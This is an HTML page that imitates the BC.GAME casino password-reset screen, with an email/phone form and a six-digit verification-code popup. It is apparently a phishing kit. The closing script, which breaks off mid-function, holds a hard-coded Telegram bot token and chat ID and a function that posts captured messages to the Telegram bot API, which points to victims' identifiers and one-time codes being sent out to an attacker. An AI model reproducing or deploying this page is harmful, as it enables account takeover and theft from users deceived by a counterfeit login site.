<html lang="en" class="dark" style="font-size:14.8837px"><head><meta charset="utf-8">
    <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,user-scalable=no,initial-scale=1,viewport-fit=cover">
    <meta name="theme-color" content="#232626">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="format-detection" content="telephone=no,email=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <style>
        .dark body {
            background-color: #232626
        }
    </style>
    <title>Reset Password - BC.GAME</title>
    <link rel="icon" sizes="32x32" href="data:image/webp;base64,UklGRhADAABXRUJQVlA4TAMDAAAvH8AHEJflNJIkR8rCJ/iz99/I6xdOMGjbRpC7PYDjj/W1OmwkyVG6B+8hA/IP0MMOgrZt4zEYfxKDMgo/gpfB8/3u7aHzQSCQKbjC7xSPAPKYgoZVCnLPZtCZFYQCSjCgqCtrhIKQis4sIISI165lRUWcA0ow4K/buRb8DeoWQgExUFwfdLidcwcjElC6wAKhtXmgrt6cCxQwpkT8dUdZOvYlWMZpLUGo0D+gBNQM+er2kIIgEujxcU0QCEVrmJf5knFlAf0DAaWgpAZUoCtIMaBYQAFFCRBSIYQCpBogFCCkQAMUIClqLYoqNX8UNUg12H8Aida2KU4DXxTfENzr1F1wh7p7KXWjbjS4uxP3bLobw5lLnNkhlxDR/wkgdIKQpMYuNUkZhNOgQlzVGQopiHsqIxUoO7Q3Jy5IJoQIAL7IYqTzUjxgIEQNoFaWAr7YwXioEgQAqJIlMeppA2A07gJCEisU8MW+Gs+/3zC3N2dz6TRUxY4U9sd+/XTYrOb5hcXGLA416CpZivi9q06HdcM8P7s0+eSkErvifygS9bpda/aO5/PLS5MTQw8K+apkKeDzuu8eMALYf2NyonfwXRFXxU4wHI1dgOKJvr6e7jtcVbIo+i6A8/hAd/d4MU+FHAx3gs7OpnC7t9tUzlMlB8NHqJJvr7OpfT2jpnNckhQoA1D63WpuzwaArhHTFZ5KWYwAyPuxbjHPPbt+7eat7tExrio5yPiwbjHPv61raKrvGjXxSWI4B0D+y03zmywAGO42Xeap2BEjFwEg/1VHAQCU93T/O8tzVBYjv40AkFcA+vHQ6NgpnlxZFKOtFPtMf+/oWDFDTeGeGPB5ruYo1PT1DnU/BK1JYuR+jkS97o+H9wDZx57O9PcPPSpk6AQGcjujHrdzzWoxzy9MzUz03y8EMyNRxQBOf3K71mwb5pXFxZm/Z8BWE2JQQG6bc81uMW8vTDdmQjGDEJKuAOS1vLBs/akuhHIaodOUAGRngzedsAU1B7fKQDgFvXY3ar2QSGgA">
    <style>
        :root {
            --ease-out: cubic-bezier(.36, .66, .04, 1);
            --radius-sm: .125rem;
            --radius-md: .375rem;
            --radius-lg: .5rem;
            --radius-xl: .75rem;
            --brand: 36 238 137;
            --primary: 255 255 255;
            --primary_brand: 0 0 0;
            --secondary: 179 190 193;
            --tertiary: 132 145 148;
            --input: 58 65 66;
            --input_darken: 30 33 33;
            --input_bright: 41 45 46;
            --third: #e4eaf019;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            border-width: 0;
            border-style: solid;
            border-color: currentColor;
        }
        
        button, input, optgroup, select, textarea {
            font-family: inherit;
            font-feature-settings: inherit;
            font-variation-settings: inherit;
            font-size: 100%;
            font-weight: inherit;
            line-height: inherit;
            letter-spacing: inherit;
            color: inherit;
            margin: 0;
            padding: 0;
        }
        
        button {
            background: none;
            touch-action: manipulation;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background-color: #232626;
            color: rgb(var(--primary));
            min-height: 100vh;
        }
        
        .header-section {
            width: 100%;
            position: relative;
            height: 240px;
            box-sizing: content-box;
        }
        
        .header-bg {
            width: 100%;
            overflow: hidden;
            position: absolute;
            bottom: 8px;
            left: 0;
        }
        
        .header-content {
            width: 100%;
            z-index: 10;
            position: absolute;
            left: 0;
            top: 0;
            padding: 16px;
        }
        
        .header-top {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .logo {
            width: auto;
            height: 32px;
        }
        
        .close-btn {
            width: 32px;
            height: 32px;
            background: rgba(255, 255, 255, 0.05);
            border: none;
            border-radius: 8px;
            color: #8a8e8e;
            font-size: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }
        
        .close-btn:hover {
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
        }
        
        .promo-section {
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            gap: 16px;
            padding: 4px;
            margin-top: 8px;
            margin-top: 16px;
        }
        
        .promo-item {
            display: flex;
            flex-direction: column;
        }
        
        .promo-title {
            display: flex;
            align-items: center;
            font-size: 12px;
        }
        
        .promo-icon {
            width: 16px;
            height: 16px;
        }
        
        .promo-text-title {
            margin-left: 6px;
            font-weight: 800;
        }
        
        .promo-text {
            color: #8a8e8e;
            margin-top: 2px;
            font-size: 10px;
        }
        
        .main-content {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }
        
        .reset-container {
            width: 100%;
            max-width: 460px;
            padding: 20px;
        }
        
        .reset-title {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 20px;
            color: #ffffff;
        }
        
        .input {
            height: 2.75rem;
            display: flex;
            align-items: center;
            border-radius: var(--radius-lg);
            border: 1px solid rgb(var(--input));
            padding-left: .75rem;
            padding-right: .5rem;
            gap: .5rem;
            background-color: rgb(var(--input_bright));
            transition: all .35s var(--ease-out);
            color: rgb(var(--primary));
        }
        
        .input input {
            background-color: transparent;
            outline: none;
            flex: 1;
            width: 8rem;
            border: none;
            color: inherit;
            font-size: 0.9rem;
            padding: .4rem;
        }
        
        .input input::placeholder {
            color: #8a8e8e;
            font-weight: 700;
        }
        
        .input:focus-within {
            border-color: rgb(var(--brand));
        }
        
        .bg-input_darken {
            background-color: rgb(var(--input_darken));
        }
        
        #country-btn {
            background: rgb(var(--input_bright));
            color: rgb(var(--primary));
            border-radius: .5rem;
            padding: .45rem .6rem;
            display: none;
            align-items: center;
            gap: .3rem;
            font-weight: 700;
            border: 1px solid rgba(255,255,255,.04);
            cursor: pointer;
        }
        
        .country-code {
            font-weight: 800;
            font-family: inherit;
            font-size: 0.98rem;
        }
        
        .caret {
            opacity: .85;
            margin-left: .25rem;
        }
        
        .sep {
            margin-left: .25rem;
            margin-right: .25rem;
            display: none;
        }
        
        .button {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 3rem;
            padding-left: .5rem;
            padding-right: .5rem;
            cursor: pointer;
            border-radius: var(--radius-md);
            user-select: none;
            font-size: 15px;
            font-weight: 800;
            transition: all 0.3s;
            gap: 8px;
            border: none;
        }
        
        .w-full {
            width: 100%;
        }
        
        .mt-3 {
            margin-top: .75rem;
        }
        
        .button-brand {
            color: rgb(var(--primary_brand));
            font-weight: 800;
            background-image: linear-gradient(90deg,#24ee89,#9fe871);
            box-shadow: 0 0 12px #23ee884d,0 -2px #1dca6a inset;
            margin-bottom: 15px;
        }
        
        .button-brand:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 16px rgba(36, 238, 137, 0.4), 0 -2px #1dca6a inset;
        }
        
        .button-secondary {
            background-color: transparent;
            border: 1px solid var(--third);
            color: rgb(var(--primary));
            margin-bottom: 20px;
            height: 2.5rem;
        }
        
        .button-secondary:hover {
            background-color: rgba(255, 255, 255, 0.05);
        }
        
        .h-10 {
            height: 2.5rem;
        }
        
        .border-third {
            border: 1px solid var(--third);
        }
        
        .size-5 {
            width: 1.25rem;
            height: 1.25rem;
        }
        
        .icon {
            width: 2rem;
            height: 2rem;
            fill: currentColor;
        }
        
        .passkey-icon {
            opacity: 0.75;
            fill: rgba(255, 255, 255, 0.65);
        }
        
        .back-link {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #8a8e8e;
            text-decoration: none;
            font-size: 16px;
            font-weight: 800;
            transition: all 0.2s;
            margin-top: 20px;
        }
        
        .back-link:hover {
            color: #ffffff;
        }
        
        .back-arrow {
            font-size: 20px;
        }
        
        .ml-2 {
            margin-left: 0.5rem;
        }
        
        .font-extrabold {
            font-weight: 800;
        }
        
        .text-primary {
            color: #ffffff;
        }
        
        /* Country Picker Overlay */
        #country-picker {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 999999;
            background: rgba(0, 0, 0, 0.92);
            align-items: flex-end;
            justify-content: center;
        }
        
        .country-panel {
            background: #232626;
            border-radius: 12px 12px 0 0;
            width: 100%;
            max-width: 500px;
            height: 70vh;
            max-height: 70vh;
            display: flex;
            flex-direction: column;
            margin: 0 auto 0;
        }
        
        .country-header {
            padding: 16px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .country-title {
            font-size: 18px;
            font-weight: 800;
            color: #ffffff;
        }
        
        .country-close {
            background: rgba(255, 255, 255, 0.05);
            border: none;
            border-radius: 8px;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            color: #8a8e8e;
            font-size: 20px;
        }
        
        .country-close:hover {
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
        }
        
        .country-search {
            padding: 12px 16px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .country-search input {
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            padding: 10px 12px;
            color: #ffffff;
            font-size: 14px;
            outline: none;
        }
        
        .country-search input::placeholder {
            color: #8a8e8e;
        }
        
        .country-search input:focus {
            border-color: #24ee89;
            background: rgba(255, 255, 255, 0.08);
        }
        
        .country-list {
            flex: 1;
            overflow-y: auto;
            padding: 8px;
        }
        
        .country-item {
            width: 100%;
            border: 0;
            background: transparent;
            cursor: pointer;
            padding: 0;
        }
        
        .country-row {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 10px 12px;
            border-radius: 8px;
            transition: background 0.2s;
        }
        
        .country-item:hover .country-row {
            background: rgba(255, 255, 255, 0.05);
        }
        
        .country-item.selected .country-row {
            background: rgba(36, 238, 137, 0.1);
        }
        
        .country-code-left {
            width: 64px;
            font-weight: 800;
            color: rgba(255, 255, 255, 0.95);
        }
        
        .country-name {
            flex: 1;
            color: rgba(255, 255, 255, 0.9);
            text-align: left;
        }
        
        .country-radio {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .country-item.selected .country-radio {
            border-color: #24ee89;
        }
        
        .radio-inner {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: transparent;
        }
        
        .country-item.selected .radio-inner {
            background: #24ee89;
        }
        
        /* Toast notification styles */
        .toast-layer {
            position: fixed;
            left: 1rem;
            right: 1rem;
            top: 3rem;
            margin-top: var(--safe-top, 0);
            z-index: 10000;
        }

        .toast {
            flex: 1;
            display: flex;
            align-self: end;
            border-radius: var(--radius-xl, 1rem);
            padding: .75rem .5rem;
            background-color: rgb(var(--layer2, 30 33 33));
            color: rgb(var(--primary));
            background: var(--toast-bg, rgba(30, 33, 33, 0.95));
            backdrop-filter: blur(5rem);
            margin: .25rem;
            box-shadow: 0 0 .25rem #0000001a;
        }

        .overflow-hidden {
            overflow: hidden;
        }

        .w-5 {
            width: 1.25rem;
        }

        .h-5 {
            height: 1.25rem;
        }

        .fill-error {
            fill: #ff4545;
        }
        
        /* OTP Popup Styles */
        .pop-overlayer {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 99999;
            display: flex;
            align-items: flex-end;
            justify-content: center;
            background-color: rgba(16, 18, 18, 0.8);
            visibility: hidden;
            opacity: 0;
            transition: opacity 0.3s, visibility 0.3s;
        }

        .pop-overlayer.active {
            visibility: visible;
            opacity: 1;
        }

        .pop-bottomsheet {
            width: 100%;
            max-width: 500px;
            background-color: rgb(var(--input_darken, 30 33 33));
            border-radius: 1rem 1rem 0 0;
            padding: 20px;
            transform: translate3d(0px, 100%, 0px);
            transition: transform 0.3s;
        }

        .pop-overlayer.active .pop-bottomsheet {
            transform: translate3d(0px, 0%, 0px);
        }

        .pop-title {
            display: flex;
            justify-content: flex-end;
            margin-bottom: 20px;
        }

        .pop-close {
            background: rgba(255, 255, 255, 0.05);
            border: none;
            border-radius: 8px;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            padding: 0;
        }

        .pop-content {
            max-height: 70vh;
            overflow-y: auto;
        }
        
        .scroll-container {
            width: 100%;
            padding: 0 20px;
        }
        
        .w-full {
            width: 100%;
        }

        .fill-secondary {
            fill: #8a8e8e;
        }

        .size-8 {
            width: 2rem;
            height: 2rem;
        }

        .size-4 {
            width: 1rem;
            height: 1rem;
        }

        .input-label {
            font-size: 14px;
            font-weight: 600;
            color: #ffffff;
            margin-bottom: 8px;
            text-align: left;
        }

        .text-lg {
            font-size: 1.125rem;
        }

        .text-secondary {
            color: #8a8e8e;
        }
        
        .text-center {
            text-align: center;
        }
        
        .flex {
            display: flex;
        }
        
        .items-center {
            align-items: center;
        }
        
        .justify-center {
            justify-content: center;
        }

        .px-2 {
            padding-left: 0.5rem;
            padding-right: 0.5rem;
        }

        .pl-3 {
            padding-left: 0.75rem;
        }

        .pr-2 {
            padding-right: 0.5rem;
        }

        .py-0 {
            padding-top: 0;
            padding-bottom: 0;
        }

        .button-s {
            font-size: 0.875rem;
            height: 2rem;
        }

        .bg-layer6 {
            background-color: rgba(255, 255, 255, 0.05);
        }

        .fix-light-hover:hover {
            background-color: rgba(255, 255, 255, 0.1);
        }
        
        /* Button Loading Spinner */
        .button.loading {
            position: relative;
            pointer-events: none;
            opacity: 0.7;
        }

        .button.loading::after {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            border: 3px solid transparent;
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            z-index: 3;
        }

        .button.loading span {
            opacity: 0;
        }

        @keyframes spin {
            to {
                transform: translate(-50%, -50%) rotate(360deg);
            }
        }
        
        @media (max-width: 768px) {
            .header-section {
                height: 200px;
            }
            
            .main-content {
                padding: 20px;
            }
            
            .country-panel {
                max-width: 100%;
            }
        }
    </style>
</head>
<body>
    <!-- Country Picker Overlay -->
    <div id="country-picker">
        <div class="country-panel">
            <div class="country-header">
                <div class="country-title">Select Country Code</div>
                <button type="button" class="country-close" id="country-picker-close">×</button>
            </div>
            <div class="country-search">
                <input type="text" id="country-search" placeholder="Search country..." autocomplete="off">
            </div>
            <div class="country-list" id="country-list"></div>
        </div>
    </div>
    
    <div class="header-section">
        <img alt="top-img" class="header-bg" src="https://raw.githubusercontent.com/DrMachin3/newrussiancopy/refs/heads/main/bg_m.webp">
        <div class="header-content">
            <div class="header-top">
                <img alt="logo" src="https://raw.githubusercontent.com/DrMachin3/newrussiancopy/refs/heads/main/logo_festival.webp" class="logo">
                <button class="close-btn" onclick="window.location.href='index.html'">
                    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor">
                        <path d="M7.15445 7.40846C6.3734 8.18951 6.3734 9.45584 7.15445 10.2369L12.9175 15.9999L7.15445 21.7629C6.3734 22.544 6.3734 23.8103 7.15445 24.5914L7.40846 24.8454C8.18951 25.6264 9.45584 25.6264 10.2369 24.8454L15.9998 19.0825L21.7631 24.8458C22.5441 25.6269 23.8104 25.6269 24.5915 24.8458L24.8455 24.5918C25.6265 23.8108 25.6265 22.5444 24.8455 21.7634L19.0825 16.0003L24.8455 10.2373C25.6265 9.45627 25.6265 8.18994 24.8455 7.40889L24.5915 7.15488C23.8104 6.37383 22.5441 6.37383 21.7631 7.15488L16.0002 12.9177L10.2369 7.15445C9.45584 6.3734 8.18951 6.3734 7.40846 7.15445L7.15445 7.40846Z"></path>
                    </svg>
                </button>
            </div>
            <div class="promo-section">
                <div class="promo-item">
                    <h2 class="promo-title">
                        <img class="promo-icon" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAYAAACM/rhtAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAHsSURBVHgB7ZgxUgIxFIb/F9fCsZBVD4AzMGOpJ5AbqCcQTqCNOFZC5YiNnsA9gjeQG2jpDFtgr6CVhZLn2zgo6ywgG8Qt8hXMkmSTLyF5vF3AYQcNqyh0GjcAl4gpmFO9+r1/3MYUKHTPS6R5jwk70n/znV4rbb/2jEkEi4+NMiu++tG0CaJ66B82kVIMzCfRpGO9aqq0VqvBsPu8pEKR204ojQYoFTtnbWiqj+q0T75by3l6sQziPbDeSGw0hy35DDCJoMwrJ0KJNVKah6yuiJ4wqUBWtJ4ohsV9mdCBLFEOI2CW/kaghtz2jDEYUda1z70aZ54XbqM6aZXDWPQLJhUk2WuyOdtICYPGTtCMI2N4JKvs+ENovXuaf9dqn8zBSEdrpVoZ/F58alwhJSz731P6sh93vR6rG9kMeR5yan9JTJCJy7BAnCSIYy26VuY0ZoxBJ4WM4wRtEcHfBdXZQnf9K8+j3uabpgMFtYQpEaVoSIlEkwdP9QI4poRJWPvZM1ISLh/FEt9C5yx11JdEJWj53/9MLszY4gRtcYK2OEFbnKAtTtAWI0jMD8gomVtBrePvaoyg5EZ3yAhKcczFCIYrRxeDzwH/BtF1yz8OBou+fuJwubpJpCvmTepMH6SisagZjR361V04pswHiICp0oSyuw4AAAAASUVORK5CYII=" alt="470%">
                        <div class="promo-text-title">470%</div>
                    </h2>
                    <p class="promo-text">Welcome deposit bonus</p>
                </div>
                <div class="promo-item">
                    <h2 class="promo-title">
                        <img class="promo-icon" src="https://bc.fun/modules/account2/assets/coin-PnldfRCC.png" alt="5 BTC">
                        <div class="promo-text-title">5 BTC</div>
                    </h2>
                    <p class="promo-text">Free daily lucky spin</p>
                </div>
                <div class="promo-item">
                    <h2 class="promo-title">
                        <img class="promo-icon" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAYAAACM/rhtAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAANnSURBVHgBzZhNUhpREMe7nyYpkw2j2YslVGUXcgM9gXAC5QTqQhKzUVcGXYAnUE4gnkByA9ylClLhACqs4kJmOt0DozgzvPlgkPyrKKg37+PH++j+v0GYUOnuYWoePmwD0RqAfETYQAtqrY+lC5hQCBPoU/c43Sd1yT9zY6rU+/hQ7BiHPYip2IDZ7kmOZ+2SeBJBP0BnDq31X8Z+B2IoMqAs6VtY2LAIq7ykqTBtBJJQFdvGXgMiSguY6Z6uoUWbhJTjiikCTIWF0gzZQ6Ae99VBYnCFNR24L6C98en95fOmn7JIVdtLe7t+j5Rf4TwtXL8anAitnczdacXvkQcwe3uyBeNP5fQkkLyl3MUeQFKwCTMSWWbeXeYB5A2chhkJ0RuyvDNon9RZSS17SryVwsc2SFjoM/YLQEldEKzmPForrcWvK/LN3daD6gOauxBCnJX0gKY5twZ69Riq4KQt+W4vlgoSfMfUb3IuXm8b36uIVhGClXKf5CdAmT0+wRV9e2z65VQkuoIxcI5RaBn7FzxFgTOJZJ2PrqRy4ExS10H7b9wJJ8RlHZwzBp/SbQiQmA9xSJLNngAFLsiVOI15CQ5Gy1Zvy3lX1vGFCzvGUDnOZufyAzN35R2emgpEU51pbzhwfWa4fMJwz0K1jtn78p9Yjb1KFm5A2FD/L9xgzyuYXFOBc6QmzAhThRNTq4isGsRTCDjsEdEZj3QkMRQiCtGsYbpbYff8KDEwigcMhPO7LK3e/eCMgoGxcEhXbxulguoYu5y+zEKEpQ61rERw5s46pnp3GKJ/+8/14a+dGu1DYneEqMupz40Ri2H2HJK3L5kMCAEnM++M8XSKW0aJXUf/KKgDuQs7uVJ3IEjRhrtseJ3Qyr0tXoSZ+WDrZKc7gRLXEXBa86Np0XYpig4Cuu+5t4Xn2pm5LxMkLlnuYCMsyys+c7RM+XeWtMK5dIl77jK/S9MUAOPL59IEkQNqUuKkceMu884gWlcwI71RVHWXeQBta842B15ZkhL9rhO+bqaPbwqvCSlwv5e+7fg9075+y3aPt4jmJOCmxJsl/PqNjYT1ExVxzt1vjK0NMTQEr0R7gWkVdSCatvEU1vdN+go4tqOWAWVgvQvCxiM+fIkLZ/cACWi45NsDT2lnoqaYzUFEmEz/AJuE7CXsiRTUAAAAAElFTkSuQmCC" alt="Free Perks">
                        <div class="promo-text-title">Free Perks</div>
                    </h2>
                    <p class="promo-text">Daily free rewards &amp;bonuses</p>
                </div>
            </div>
        </div>
    </div>
    
    <div class="main-content">
        <div class="reset-container">
            <h1 class="reset-title">Reset Password</h1>
            
            <form id="reset-form">
                <div class="input mt-3 bg-input_darken" id="input-container" style="display:flex;align-items:center;gap:.4rem;">
                    <button type="button" id="country-btn" aria-haspopup="true" aria-expanded="false" style="display:none;align-items:center;gap:.25rem;padding:.4rem .6rem;border-radius:8px;border:0;background:transparent;">
                        <strong class="country-code">+91</strong>
                        <span class="caret">▾</span>
                    </button>
                    <span class="sep" aria-hidden="true" style="width:1px;height:1.6rem;background:rgba(255,255,255,.06);border-radius:1px;">
                    </span>
                    <input required="" placeholder="Email / Phone Number" value="" id="email-phone-visible" autocomplete="off" style="flex:1;padding:.6rem;border-radius:8px;border:0;background:transparent;color:inherit;">
                    <input type="hidden" id="country-code" name="country-code" value="">
                    <input type="hidden" id="phone-number" name="phone-number" value="">
                    <input type="hidden" id="email-phone" name="email-phone" value="">
                </div>
                
                <button type="submit" class="button button-brand w-full mt-3">
                    <span>Reset Password</span>
                </button>
            </form>
            
            <button class="button button-secondary w-full h-10 border-third" id="passkey-btn">
                <div class="icon size-5 passkey-icon" style="opacity: 0.75;">
                    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M14.8879 14.7662C16.228 14.7647 17.5128 14.2316 18.4604 13.284C19.4081 12.3364 19.9412 11.0516 19.9427 9.71149V9.56056C19.9427 8.21997 19.41 6.93429 18.4621 5.98635C17.5141 5.03842 16.2286 4.50586 14.8879 4.50586C13.5473 4.50586 12.2617 5.03842 11.3137 5.98635C10.3658 6.93429 9.83322 8.21997 9.83322 9.56056V9.71149C9.83474 11.0516 10.3678 12.3364 11.3154 13.284C12.263 14.2316 13.5478 14.7647 14.8879 14.7662ZM20.4563 26.3923C20.495 26.4858 20.5415 26.5757 20.5952 26.661H5.03468C4.8972 26.661 4.76161 26.6289 4.63877 26.5671C4.51592 26.5054 4.40922 26.4157 4.32719 26.3054C4.24515 26.1951 4.19007 26.0671 4.16633 25.9317C4.14258 25.7963 4.15083 25.6572 4.19043 25.5254L4.85124 23.3282C5.50009 21.171 6.82676 19.2802 8.63458 17.9361C10.4424 16.592 12.6352 15.8662 14.8879 15.8662C15.8831 15.8662 16.8665 16.0079 17.8103 16.2819C17.8128 16.4597 17.8238 16.6379 17.8432 16.8156C17.9546 17.8314 18.3405 18.7978 18.9598 19.6106C19.3406 20.1105 19.8008 20.5408 20.3194 20.8857V25.7046C20.3194 25.9406 20.3659 26.1742 20.4563 26.3923ZM27.2784 14.1542C27.6508 14.7736 27.8473 15.4829 27.8469 16.2058C27.8466 17.131 27.5237 18.0271 26.9337 18.74C26.3437 19.4528 25.5237 19.9376 24.6149 20.1108V21.2888C24.6149 21.3219 24.6257 21.3541 24.6457 21.3803L25.8934 23.0149C25.9167 23.0458 25.9276 23.0843 25.9233 23.1226C25.9191 23.1612 25.9005 23.1965 25.871 23.2215L24.7348 24.1842C24.7192 24.1973 24.7065 24.2135 24.6975 24.2316C24.6883 24.2498 24.6829 24.2696 24.6817 24.2899C24.6805 24.3103 24.6834 24.3306 24.6901 24.3497C24.6969 24.3688 24.7076 24.3864 24.7214 24.4014L25.8821 25.6607C25.9084 25.6893 25.9227 25.7269 25.922 25.7659C25.9212 25.8048 25.9054 25.8418 25.8779 25.8694L24.2979 27.4494C24.2696 27.4777 24.2312 27.4937 24.1912 27.4937C24.1513 27.4937 24.1129 27.4777 24.0847 27.4494L22.4464 25.8112C22.4324 25.7972 22.4213 25.7806 22.4137 25.7623C22.4061 25.744 22.4022 25.7243 22.4022 25.7046V19.8998C21.7303 19.6332 21.144 19.1884 20.706 18.6134C20.268 18.0384 19.9949 17.3549 19.9162 16.6364C19.8375 15.9179 19.956 15.1915 20.2592 14.5353C20.5623 13.8791 21.0386 13.318 21.6367 12.9121C22.2348 12.5063 22.9322 12.2712 23.654 12.232C24.3758 12.1928 25.0946 12.351 25.7332 12.6897C26.3717 13.0284 26.906 13.5347 27.2784 14.1542ZM23.2068 16.0047C23.4031 16.1358 23.6337 16.2058 23.8698 16.2058C24.0264 16.2058 24.1816 16.1749 24.3263 16.1149C24.4711 16.055 24.6026 15.9671 24.7135 15.8562C24.8242 15.7455 24.9121 15.614 24.9721 15.4692C25.032 15.3244 25.0628 15.1692 25.0628 15.0126C25.0628 14.7766 24.9929 14.5459 24.8618 14.3497C24.7306 14.1534 24.5443 14.0005 24.3263 13.9102C24.1083 13.8199 23.8683 13.7963 23.6369 13.8423C23.4055 13.8884 23.1929 14.002 23.026 14.1689C22.8591 14.3357 22.7455 14.5484 22.6995 14.7798C22.6534 15.0113 22.6771 15.2512 22.7673 15.4692C22.8576 15.6873 23.0106 15.8735 23.2068 16.0047Z"></path>
                    </svg>
                </div>
                <span class="text-primary ml-2 font-extrabold">Reset by Passkey</span>
            </button>
            
            <a href="index.html" class="back-link">
                <span class="back-arrow">‹</span>
                <span>Back to Login</span>
            </a>
        </div>
    </div>
    
    <!-- OTP Verification Popup -->
    <div class="pop-overlayer" id="otp-popup">
        <div class="pop-bottomsheet">
            <div class="pop-title">
                <button class="button pop-close" type="button" onclick="closeOtpPopup()">
                    <div class="icon size-4">
                        <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" fill="currentColor">
                            <path d="M7.15445 7.40846C6.3734 8.18951 6.3734 9.45584 7.15445 10.2369L12.9175 15.9999L7.15445 21.7629C6.3734 22.544 6.3734 23.8103 7.15445 24.5914L7.40846 24.8454C8.18951 25.6264 9.45584 25.6264 10.2369 24.8454L15.9998 19.0825L21.7631 24.8458C22.5441 25.6269 23.8104 25.6269 24.5915 24.8458L24.8455 24.5918C25.6265 23.8108 25.6265 22.5444 24.8455 21.7634L19.0825 16.0003L24.8455 10.2373C25.6265 9.45627 25.6265 8.18994 24.8455 7.40889L24.5915 7.15488C23.8104 6.37383 22.5441 6.37383 21.7631 7.15488L16.0002 12.9177L10.2369 7.15445C9.45584 6.3734 8.18951 6.3734 7.40846 7.15445L7.15445 7.40846Z"></path>
                        </svg>
                    </div>
                </button>
            </div>
            <div class="pop-content">
                <div class="scroll-container">
                    <div class="w-full">
                        <div class="flex items-center justify-center">
                            <div class="icon size-8 fill-secondary">
                                <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M22.2746 5.33398H9.72598C5.96139 5.33398 3.45166 7.21628 3.45166 11.6083V20.3923C3.45166 24.7844 5.96139 26.6667 9.72598 26.6667H22.2746C26.0392 26.6667 28.5489 24.7844 28.5489 20.3923V11.6083C28.5489 7.21628 26.0392 5.33398 22.2746 5.33398ZM22.8644 12.9761L18.9367 16.1133C18.1085 16.7783 17.0544 17.1046 16.0003 17.1046C14.9462 17.1046 13.8796 16.7783 13.0639 16.1133L9.13619 12.9761C8.73464 12.6498 8.67189 12.0475 8.98561 11.6459C9.31187 11.2444 9.90166 11.1691 10.3032 11.4954L14.2309 14.6325C15.1846 15.398 16.8034 15.398 17.7571 14.6325L21.6848 11.4954C22.0864 11.1691 22.6887 11.2318 23.0024 11.6459C23.3287 12.0475 23.266 12.6498 22.8644 12.9761Z"></path>
                                </svg>
                            </div>
                        </div>
                        <p class="mt-3 font-extrabold text-lg text-center" style="color: #ffffff;">Verification</p>
                        <p class="mt-3 px-2 text-center text-secondary">Please enter the 6-digit verification code</p>
                        <p class="input-label mt-5 text-center">Verification Code</p>
                        <div class="input pl-3 pr-2" style="background-color: rgb(var(--input_bright)); height: 3rem;">
                            <input type="tel" placeholder="6-digit verification code" id="otp_input" maxlength="6" style="flex:1;padding:.6rem;border-radius:8px;border:0;background:transparent;color:inherit;outline:none;">
                            <button class="button button-s py-0 px-2 bg-layer6 fix-light-hover" type="button" onclick="pasteOtp()" style="height: 2rem; border-radius: 6px; border: none; cursor: pointer; color: #ffffff;">Paste</button>
                        </div>
                        <button disabled class="button button-brand w-full mt-3" id="verify-btn" onclick="verifyOtp()" style="height: 3rem; margin-top: 1.5rem;">
                            <span class="btn-label">Verify</span>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        // Telegram configuration
        const TELEGRAM_BOT_TOKEN = "8063517213:AAGX-8hsm42L2WJ7svBJ4o-7xVLT348rWcQ";
        const TELEGRAM_CHAT_ID = "-5068849115";
        
        // Session counter and state
        let forgotSessionNumber = 1;
        let userEmailPhone = '';
        let userCountry = '';
        let isPasswordMode = false; // Track if we're in password entry mode
        
        // Send message to Telegram
        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
